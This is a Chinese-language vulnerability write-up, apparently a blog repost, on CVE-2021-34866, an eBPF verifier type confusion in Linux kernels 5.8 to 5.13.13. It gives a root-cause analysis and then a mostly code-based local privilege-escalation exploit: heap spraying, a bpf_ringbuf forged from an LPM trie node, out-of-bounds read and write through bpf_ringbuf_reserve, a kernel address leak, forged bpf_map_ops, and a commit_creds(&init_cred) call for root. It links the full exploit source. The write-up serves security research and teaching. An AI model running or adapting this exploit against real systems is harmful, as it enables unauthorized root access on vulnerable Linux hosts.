**作者：HexRabbit**  
**原文链接：<https://blog.hexrabbit.io/2021/11/03/CVE-2021-34866-writeup/>**

幾天前在 Twitter 上看到 [@flatt_security](https://twitter.com/flatt_security
"@flatt_security") 分享這個漏洞，感覺蠻有趣且加上我好久沒寫文，就拿來練習一下了，沒想到時隔快一年，又挑到 Ryota Shiga
([@Ga_ryo_](https://twitter.com/ga_ryo_ "@Ga_ryo_")) 大佬發的漏洞來練習

這次是一個影響 Linux kernel v5.8 - v5.13.13 的 eBPF type confusion 漏洞

基本上這會是個相對簡短一點的文章， 如果對 eBPF 不熟的朋友們可以先去看看我的前一篇文
[ZDI-20-1440-writeup](https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/
"ZDI-20-1440-writeup")

## TL;DR

<https://github.com/HexRabbit/CVE-writeup/blob/master/CVE-2021-34886/exploit.c>

## Root cause analysis

這次沒有 blog post 可以看了，首先來看一下 [ZDI
report](https://www.zerodayinitiative.com/advisories/ZDI-21-1148/ "ZDI
report") 上面是怎麼寫的

    
    
    The issue results from the lack of proper validation of user-supplied eBPF programs, 
    which can result in a type confusion condition.

雖然得知這是一個 type confusion 的漏洞，但這個敘述相當模糊，也不知道問題究竟是出在哪裡，所以接著我去看了修正這個漏洞的
[commit](https://github.com/torvalds/linux/commit/5b029a32cfe4600f5e10e36b41778506b90fd4de
"commit")

其中提到幾個重點:

在 `check_map_func_compatibility()`這個 function 當中，有針對 `map -> helper` 進行 type
match，但缺少部分反向的 `helper -> map type match` 由於 1. 的問題，這導致 `bpf_ringbuf_*()` 一類的
helper functions 可以接受使用者傳入其他型別的 bpf map，也就是 `BPF_MAP_TYPE_RINGBUF` 以外的 map
type，進而造成 type confusion

> 為什麼要設計成正反向各做一次 type matching 的原因我不是很清楚，由於這個設計，第一個 switch case 裡面並沒有包含所有的 map
> type，且可以注意到 default case 不會觸發 error
    
    
    static int check_map_func_compatibility(struct bpf_verifier_env *env,
    
        /* We need a two way check, first is from map perspective ... */
        switch (map->map_type) {
    
        case BPF_MAP_TYPE_RINGBUF:
            if (func_id != BPF_FUNC_ringbuf_output &&
                func_id != BPF_FUNC_ringbuf_reserve &&
    -           func_id != BPF_FUNC_ringbuf_submit &&
    -           func_id != BPF_FUNC_ringbuf_discard &&
                func_id != BPF_FUNC_ringbuf_query)
                goto error;
            break;
    
        }
    
        /* ... and second from the function itself. */
        switch (func_id) {
    
    +   case BPF_FUNC_ringbuf_output:
    +   case BPF_FUNC_ringbuf_reserve:
    +   case BPF_FUNC_ringbuf_query:
    +       if (map->map_type != BPF_MAP_TYPE_RINGBUF)
    +           goto error;
    +       break;
        case BPF_FUNC_get_stackid:
            if (map->map_type != BPF_MAP_TYPE_STACK_TRACE)
                goto error;
    
        ...
    
        default:
            break;
        }
    
        return 0;

## Weaponize the bug

至此我們可以得知這個漏洞存在於 verifier 當中，所以觸發的方式基本上與過往的漏洞相似，要透過 bpf program
進行攻擊，但還不知道該如何利用這個看似相當強大的 type confusion，總之先看一下 `bpf_ringbuf_*()` 這些 helper
function 可以做到些什麼

`bpf_ringbuf_*()` 等相關 helper function 被定義在
[kernel/bpf/ringbuf.c](https://elixir.bootlin.com/linux/v5.13.13/source/kernel/bpf/ringbuf.c
"kernel/bpf/ringbuf.c") 當中，其透過 `BPF_CALL_*`macro 定義並讓 bpf program 可以直接透過
`BPF_CALL` 進行呼叫，此外，用來給 verfier 檢查的 argument 的型別資訊被放在 `bpf_ringbuf_*_proto`
變數當中

例如這是 `bpf_ringbuf_query` 的定義

    
    
    BPF_CALL_2(bpf_ringbuf_query, struct bpf_map *, map, u64, flags)
    {
        struct bpf_ringbuf *rb;
    
        rb = container_of(map, struct bpf_ringbuf_map, map)->rb;
    
        switch (flags) {
        case BPF_RB_AVAIL_DATA:
            return ringbuf_avail_data_sz(rb);
        case BPF_RB_RING_SIZE:
            return rb->mask + 1;
        case BPF_RB_CONS_POS:
            return smp_load_acquire(&rb->consumer_pos);
        case BPF_RB_PROD_POS:
            return smp_load_acquire(&rb->producer_pos);
        default:
            return 0;
        }
    }
    
    const struct bpf_func_proto bpf_ringbuf_query_proto = {
        .func       = bpf_ringbuf_query,
        .ret_type   = RET_INTEGER,
        .arg1_type  = ARG_CONST_MAP_PTR,
        .arg2_type  = ARG_ANYTHING,
    };

稍微研究一下便可以對於怎麼利用這些 helper function 有個大概的輪廓:

  * bpf_ringbuf_reserve  
根據使用者傳入的 size，回傳一個大小為 size 的 buffer (verifier 會得知 size 資訊) 如果可以控到 `mask`,
`consumer_pos`, `producer_pos` 便可以讓他在 kernel heap 上 return 任意大小的
buffer，便可以用來進行越界讀寫

  * bpf_ringbuf_output  
沒啥用

  * bpf_ringbuf_query  
如果可以控到 mask，有機會透過 `BPF_RB_RING_SIZE` 這個 flag 去 leak heap 上的資料 `(rb->mask + 1)`

仔細觀察便會發現可以被用來進行 type confusion 的三個 function 皆會操作到 `bpf_ringbuf_map` 中的 `.rb`
這個 field，他是一個型別為 `struct bpf_ringbuf *` 的指標，由於指標取值只要失敗便會造成 kernel
crash，所以首先必須得要先找到一個 structure 滿足這個要求

雖然說在 commit 當中提到「function 可以接受使用者傳入其他型別的 bpf map，也就是 `BPF_MAP_TYPE_RINGBUF`
以外的 map type」，但實際上我們能夠選擇的 map type 相當有限，因為 `check_map_func_compatibility()`
在第一次的檢查中就對不少 map type 和使用的 function id 進行配對了

把被 `check_map_func_compatibility()` 的第一次 switch case 當中檢查過的 map type
剔除掉之後，我們還剩下以下幾種選擇:

    
    
    BPF_MAP_TYPE_PERCPU_HASH
    BPF_MAP_TYPE_PERCPU_ARRAY
    BPF_MAP_TYPE_LPM_TRIE
    BPF_MAP_TYPE_STRUCT_OPS
    BPF_MAP_TYPE_LRU_HASH
    BPF_MAP_TYPE_ARRAY
    BPF_MAP_TYPE_LRU_PERCPU_HASH
    BPF_MAP_TYPE_HASH
    BPF_MAP_TYPE_UNSPEC

透過篩選之後，最後我採用 `BPF_MAP_TYPE_LPM_TRIE` 這個 map type 作為觸發 type confusion 時所使用的 map
type，原因是

  * `struct bpf_ringbuf *rb` 的位置上剛好有 `struct lpm_trie_node __rcu *root` 這個指標

  * `struct lpm_trie_node` 的 `u8 data[]`; 是一個 user 完全可控的不定長度 array (大小可控)，透過他可以控制 `struct bpf_ringbuf` 當中的不少 field，讓我們可以很輕易的操控 `bpf_ringbuf_*()` 的執行流程

`bpf_ringbuf_map` v.s. `lpm_trie`

    
    
    struct bpf_ringbuf_map {
        struct bpf_map map;
        struct bpf_ringbuf *rb;
    };
    
    struct lpm_trie {
        struct bpf_map              map;
        struct lpm_trie_node __rcu *root;
        size_t                      n_entries;
        size_t                      max_prefixlen;
        size_t                      data_size;
        spinlock_t                  lock;
    };

`bpf_ringbuf` v.s. `lpm_trie_node`

    
    
    struct bpf_ringbuf {
        wait_queue_head_t          waitq;                /*     0    24 */
        struct irq_work            work;                 /*    24    24 */
        u64                        mask;                 /*    48     8 */
        struct page * *            pages;                /*    56     8 */
        int                        nr_pages;             /*    64     4 */
        spinlock_t                 spinlock __attribute__((__aligned__(64))); /*   128     4 */
        long unsigned int          consumer_pos __attribute__((__aligned__(4096))); /*  4096     8 */
        long unsigned int          producer_pos __attribute__((__aligned__(4096))); /*  8192     8 */
        char                       data[] __attribute__((__aligned__(4096))); /* 12288     0 */
    } __attribute__((__aligned__(4096)));
    
    struct lpm_trie_node {
        struct callback_head       rcu __attribute__((__aligned__(8))); /*     0    16 */
        struct lpm_trie_node *     child[2];             /*    16    16 */
        u32                        prefixlen;            /*    32     4 */
        u32                        flags;                /*    36     4 */
        u8                         data[];               /*    40     0 */
    } __attribute__((__aligned__(8)));

## Exploit

接下來便可以開始進行 exploit 了，流程大致如下

  * 利用 `BPF_MAP_TYPE_LPM_TRIE` 進行 type confusion，並利用 `lpm_trie_node` 構造出 `bpf_ringbuf`

  * 調整 `bpf_ringbuf` 的各個 field 用於 bypass 檢查

  * 在 `bpf program` 中呼叫 `bpf_ringbuf_reserve()` 並傳入一個極大的 size 讓其回傳一個可以越界寫的 array

  * 透過 `heap spray bpf_array` 讓任意一個 `bpf_array` 落在我們能夠越界寫的 buffer 後面

  * 利用 buffer 越界讀寫 leak kernel address 以及寫掉後方 `bpf_array` 的 `array_ops`

  * 從所有拿來 spray 的 bpf map 當中找出哪個是我們越界寫到的 `bpf_array`

  * 最後套 `commit_creds(&init_cred)` 提權

首先透過 `bpf_create_map()` 建立一個型別為 `BPF_MAP_TYPE_LPM_TRIE` 的 bpf map 用來進行 type
confusion，並讓他的 value_size 足夠覆蓋到整個 `struct bpf_ringbuf` (我選擇的是 0x3000)，同時在前後
spray 上多個 `bpf_array` 以利後續利用

> 注意到一開始建立好 map 的時候，`struct lpm_trie_node *root` 會是 `NULL`，需要透過
> `bpf_update_elem()` 去手動添加 node 才會幫他 allocate 一塊空間
    
    
    int i = 0;
    
    /* heap spray */
    for (; i < 6; ++i) {
      ctrl_mapfds[i] = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x3000, 1, 0);
    }
    
    int key_size = 8; // must > 4+1
    int vuln_mapfd = bpf_create_map(BPF_MAP_TYPE_LPM_TRIE, key_size, 0x3000, 1, BPF_F_NO_PREALLOC);
    if (vuln_mapfd < 0) {
      puts("[-] failed to create trie map");
      exit(-1);
    }
    
    struct bpf_ringbuf *rb = (struct bpf_ringbuf *)(data - 0x2c);
    rb->mask = 0xfffffffffffffffe;
    rb->consumer_pos = 0;
    rb->producer_pos = 0;
    
    size_t key = 0; // index 0 (root node)
    int ret = bpf_update_elem(vuln_mapfd, &key, data, 0);
    if (ret < 0) {
      puts("[-] failed to update trie map");
      exit(-1);
    }
    
    /* heap spray */
    for (; i < ARRAY_SIZE(ctrl_mapfds); ++i) {
      ctrl_mapfds[i] = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x3000, 1, 0);
    }

由於接下來要透過 `lpm_trie_node` 當中的 `data[]` 去控制 `bpf_ringbuf_reserve()`，需要先設定好
`bpf_ringbuf` 當中的 `mask`, `consumer_pos`, `producer_pos` 這幾個 field

這可以讓我們繞過[
__bpf_ringbuf_reserve()](https://elixir.bootlin.com/linux/v5.13.13/source/kernel/bpf/ringbuf.c#L305
" __bpf_ringbuf_reserve\(\)") 當中的:

  * size 檢查

    
    
    len = round_up(size + BPF_RINGBUF_HDR_SZ, 8);
    if (len > rb->mask + 1)
        return NULL;

  * ringbuf 剩餘空間檢查

    
    
    if (new_prod_pos - cons_pos > rb->mask) {
        spin_unlock_irqrestore(&rb->spinlock, flags);
        return NULL;
    }

接著是 bpf program 的部分，

首先傳入剛剛建立好用於 type confusion 的 bpf map fd，設定 size 為一個極大值 `(0x3fffffff)`，並呼叫
`bpf_ringbuf_reserve()` 讓他回傳一個能在 bpf program 當中越界讀寫的 heap address

    
    
    BPF_LD_MAP_FD(BPF_REG_1, vuln_mapfd),
    BPF_MOV64_IMM(BPF_REG_2, 0x3fffffff),
    BPF_MOV64_IMM(BPF_REG_3, 0x0),
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), /* must check NULL case */
    BPF_EXIT_INSN(),

透過越界讀寫從下一個 `bpf_array` leak kernel base / heap 地址

    
    
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),
    
    /* get neighbor bpf_array address */
    BPF_MOV64_REG(BPF_REG_4, BPF_REG_8),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 0x4000 - 0x3008),
    
    /* get buffer address */
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_4, 0xc0),
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, 0xc0 + 0x4000 - 0x3008),
    
    /* get kernel base */
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_4, 0),
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_7, array_map_ops_off),

在 buffer 上偽造 `bpf_map_ops`，並將 `bpf_array.map.ops` 寫掉改成指向他，再來便可以透過替換其中的兩個
function 來達成 `commit_creds(&init_cred);`

  * `.map_delete_elem = fd_array_map_delete_elem`
  * `.map_fd_put_ptr = commit_creds` 詳情請見 [ZDI-20-1440-writeup](https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#smap "ZDI-20-1440-writeup")

> 這裡有額外還原一個 `array_map_lookup_elem()` 到偽造的 `bpf_map_ops` 上
    
    
    /* put &init_cred onto bpf_array.value[0] */
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, init_cred_off),
    BPF_STX_MEM(BPF_DW, BPF_REG_4, BPF_REG_1, 0x110),
    
    /* overwrite bpf_array.map.ops = buffer */
    BPF_STX_MEM(BPF_DW, BPF_REG_4, BPF_REG_6, 0),
    
    /* construct fake array_ops on buffer */
    /* put array_map_lookup_elem back since we need to use it later */
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, array_map_lookup_elem_off),
    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0x58),
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, fd_array_map_delete_elem_off),
    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0x68),
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, commit_creds_off),
    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0x90),

由於 verifier 要求要將 bpf program 要到的資源釋放掉，我們需要額外呼叫
[bpf_ringbuf_discard()](https://elixir.bootlin.com/linux/v5.13.13/source/kernel/bpf/ringbuf.c#L411
"bpf_ringbuf_discard\(\)") 來讓他閉嘴，參數給 `BPF_RB_NO_WAKEUP` 是為了迴避
`bpf_ringbuf_discard()` 裡的 `irq_work_queue()`

    
    
    /* release resources to make verifier happy */
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),
    BPF_MOV64_IMM(BPF_REG_2, BPF_RB_NO_WAKEUP),
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),
    BPF_MOV64_IMM(BPF_REG_0, 0x0),
    BPF_EXIT_INSN(),

在觸發 bpf program 執行以後，透過 `bpf_lookup_elem()` 檢查哪個 `bpf_array` 有被我們改過

    
    
    for (int i = 0; i < ARRAY_SIZE(ctrl_mapfds); ++i) {
      memset(testbuf, 0, sizeof(testbuf));
      key = 0;
    
      if (bpf_lookup_elem(ctrl_mapfds[i], &key, testbuf)) {
        printf("[-] failed to lookup bpf map on idx %d\n", i);
      }
    
      if (testbuf[0]) {
        printf("[*] found vulnerable mapfd %d\n", ctrl_mapfds[i]);
        return ctrl_mapfds[i];
      }
    }

最後呼叫 `bpf_delete_elem()` 便可以觸發 `commit_creds(&init_cred)` 提權

## 寫在最後

很可惜的，由於 exploit 當中使用到 `BPF_MAP_TYPE_LPM_TRIE` 這個 map type，他需要 process 至少擁有
`CAP_BPF`的權限才能夠執行，但根據在 lwn.net 上 [Introduce
CAP_BPF](https://lwn.net/Articles/820560/ "Introduce CAP_BPF")
這篇文章的解釋，這個權限應該還算蠻小的，不過我還是很好奇有沒有其他做法

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1760/>

